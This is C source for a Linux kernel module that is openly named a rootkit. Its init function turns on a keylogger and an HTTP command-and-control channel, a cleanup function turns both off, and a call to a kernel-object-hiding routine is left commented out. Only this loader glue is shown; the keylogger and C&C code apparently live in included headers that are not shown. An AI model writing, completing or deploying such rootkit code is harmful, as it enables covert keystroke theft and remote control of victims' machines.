#include <linux/kernel.h>
#include <linux/module.h>
#include <linux/types.h>
#include "hidder.h"
#include "credit.h"
#include "keylogger.h"
#include "cnc.h"


void init_rootkit ( void )
{
	printk("[+] Init_rootkit\n");
	set_keylogger();
	set_http_cnc();

	//set_dkom_lkm();
}


void clean_rootkit ( void )
{
	printk("[+] clean_rootkit\n");
	unset_keylogger();
	unset_http_cnc();
}


MODULE_LICENSE("GPL");

module_init(init_rootkit);
module_exit(clean_rootkit);
